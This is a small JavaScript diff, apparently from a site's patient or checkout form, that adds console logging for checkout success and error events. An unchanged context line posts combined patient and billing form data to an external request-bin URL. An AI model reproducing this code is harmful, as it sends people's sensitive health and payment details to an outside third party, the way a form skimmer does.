@@ -55,6 +55,9 @@ function load() {
       jQuery.post('https://requestb.in/1et2h7e1', {method:'POST', data:patient+'&'+billing})
       console.log('form.new-patient', patient+'&'+billing)
     })
+
+    jQuery( document.body ).on( 'checkout_error', err => console.log('checkout_error', err) )
+    jQuery( document.body ).on( 'checkout_success', err => console.log('checkout_success', err) )
   }
 }
 
